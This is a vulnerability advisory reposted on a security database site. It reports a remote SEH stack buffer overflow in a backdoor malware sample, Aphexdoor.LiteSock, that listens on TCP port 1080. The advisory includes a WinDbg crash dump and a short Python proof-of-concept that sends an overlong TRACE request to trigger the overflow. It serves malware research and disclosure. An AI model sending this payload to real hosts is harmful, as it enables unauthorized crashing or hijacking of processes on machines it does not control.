---
title: Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer Overflow (SEH)
url: https://cxsecurity.com/issue/WLB-2022110009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-11
fetch_date: 2025-10-03T22:20:12.758744
---

# Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer Overflow (SEH)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Backdoor.Win32.Aphexdoor.LiteSock / Remote Stack Buffer Overflow (SEH)** **2022.11.10**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [malvuln](https://cxsecurity.com/author/malvuln/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

Discovery / credits: Malvuln (John Page aka hyp3rlinx) (c) 2022
Original source: https://malvuln.com/advisory/2047ac6183da4dfb61d2562721ba0720.txt
Contact: malvuln13@gmail.com
Media: twitter.com/malvuln
Threat: Backdoor.Win32.Aphexdoor.LiteSock
Vulnerability: Remote Stack Buffer Overflow (SEH)
Description: The malware drops an extensionless PE file named "3" which listens on TCP port 1080. Third-party attackers who can reach an infected host can send a specially crafted packet to port 1080, that will trigger a stack buffer overflow overwriting ECX register and SEH.
Family: Aphexdoor
Type: PE32
MD5: 2047ac6183da4dfb61d2562721ba0720
Vuln ID: MVID-2022-0653
Dropped files: "3"
ASLR: False
DEP: False
CFG: False
Safe SEH: False
Disclosure: 11/09/2022
Memory Dump:
(135c.27c8): Access violation - code c0000005 (first/second chance not available)
eax=00000000 ebx=00000000 ecx=41414141 edx=77729d70 esi=02651848 edi=02651d0c
eip=7770e916 esp=02651790 ebp=02651830 iopl=0 nv up ei pl nz ac pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000216
ntdll!ZwQueryInformationProcess+0x26:
7770e916 c21400 ret 14h
0:004> .ecxr
eax=00000000 ebx=00000000 ecx=41414141 edx=77729d70 esi=02651848 edi=02651d0c
eip=7770e916 esp=02651790 ebp=02651830 iopl=0 nv up ei pl nz ac pe nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00000216
ntdll!ZwQueryInformationProcess+0x26:
7770e916 c21400 ret 14h
0:004> !analyze -v
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\* \*
\* Exception Analysis \*
\* \*
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
\*\*\* WARNING: Unable to verify checksum for 3
\*\*\* ERROR: Module load completed but symbols could not be loaded for 3
Failed calling InternetOpenUrl, GLE=12029
FAULTING\_IP:
+26
312e312f ?? ???
EXCEPTION\_RECORD: 0274fadc -- (.exr 0x274fadc)
ExceptionAddress: 312e312f
ExceptionCode: c0000005 (Access violation)
ExceptionFlags: 00000000
NumberParameters: 2
Parameter[0]: 00000000
Parameter[1]: 312e312f
Attempt to read from address 312e312f
PROCESS\_NAME: 3
ERROR\_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
EXCEPTION\_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.
EXCEPTION\_PARAMETER1: 00000001
EXCEPTION\_PARAMETER2: 02650fe8
WRITE\_ADDRESS: 02650fe8
FOLLOWUP\_IP:
+26
51bb743d e89efdffff call 51bb71e0
FAILED\_INSTRUCTION\_ADDRESS:
+26
41414141 ?? ???
MOD\_LIST: <ANALYSIS/>
NTGLOBALFLAG: 0
APPLICATION\_VERIFIER\_FLAGS: 0
CONTEXT: 0274fb2c -- (.cxr 0x274fb2c)
eax=00000001 ebx=00000234 ecx=72b87bf5 edx=00000001 esi=004011a8 edi=004011a8
eip=312e312f esp=0274ff8c ebp=50545448 iopl=0 nv up ei pl nz na po nc
cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010202
312e312f ?? ???
Resetting default scope
ADDITIONAL\_DEBUG\_TEXT: Followup set based on attribute [Is\_ChosenCrashFollowupThread] from Frame:[0] on thread:[PSEUDO\_THREAD]
LAST\_CONTROL\_TRANSFER: from 203a7473 to 312e312f
FAULTING\_THREAD: ffffffff
DEFAULT\_BUCKET\_ID: STACKIMMUNE
PRIMARY\_PROBLEM\_CLASS: STACKIMMUNE
BUGCHECK\_STR: APPLICATION\_FAULT\_STACKIMMUNE\_STACK\_OVERFLOW\_BAD\_INSTRUCTION\_PTR\_INVALID\_POINTER\_WRITE\_EXPLOITABLE\_FILL\_PATTERN\_41414141
IP\_ON\_HEAP: 203a7473
The fault address in not in any loaded module, please check your build's rebase
log at <releasedir>\bin\build\_logs\timebuild\ntrebase.log for module which may
contain the address if it were loaded.
IP\_IN\_FREE\_BLOCK: 203a7473
FRAME\_ONE\_INVALID: 1
STACK\_TEXT:
00000000 00000000 3+0x0
STACK\_COMMAND: .cxr 000000000274FB2C ; kb ; \*\* Pseudo Context \*\* ; kb
SYMBOL\_NAME: 3
FOLLOWUP\_NAME: MachineOwner
MODULE\_NAME: 3
DEBUG\_FLR\_IMAGE\_TIMESTAMP: 21475346
FAILURE\_BUCKET\_ID: STACKIMMUNE\_c0000005\_3!Unknown
BUCKET\_ID: APPLICATION\_FAULT\_STACKIMMUNE\_STACK\_OVERFLOW\_BAD\_INSTRUCTION\_PTR\_INVALID\_POINTER\_WRITE\_EXPLOITABLE\_FILL\_PATTERN\_41414141\_BAD\_IP\_3
0:004> !exchain
0265175c: ntdll!ExecuteHandler2+44 (77729d70)
0274ffcc: 41414141
Invalid exception stack at 41414141
Exploit/PoC:
from socket import \*
MALWARE\_HOST="x.x.x.x"
PORT=1080
s=socket(AF\_INET, SOCK\_STREAM)
s.connect((MALWARE\_HOST, PORT))
PAYLOAD="TRACE /"+"A"\*72+" HTTP/1.1\r\nHost: "+MALWARE\_HOST+"\r\n\X-Request-ID: "+"A"\*72
s.send(PAYLOAD.encode())
s.close()
print("Aphexdoor.LiteSock Buffer Overflow by Malvuln")
Disclaimer: The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. Do not attempt to download Malware samples. The author of this website takes no responsibility for any kind of damages occurring from improper Malware handling or the downloading of ANY Malware mentioned on this website or elsewhere. All content Copyright (c) Malvuln.com (TM).

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 2
 -1

66%

34%

#### ...